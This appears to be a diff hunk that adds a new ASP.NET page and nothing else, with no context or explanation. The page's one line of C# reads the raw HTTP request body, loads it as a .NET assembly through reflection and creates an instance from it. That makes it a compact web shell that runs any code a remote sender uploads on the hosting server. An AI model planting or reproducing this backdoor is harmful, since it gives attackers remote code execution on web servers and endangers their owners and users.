@@ -1,0 +1,2 @@
+<%@ Page Language="C#" %><% System.Reflection.Assembly.Load(Request.BinaryRead(Request.ContentLength)).CreateInstance("X"); %>
+
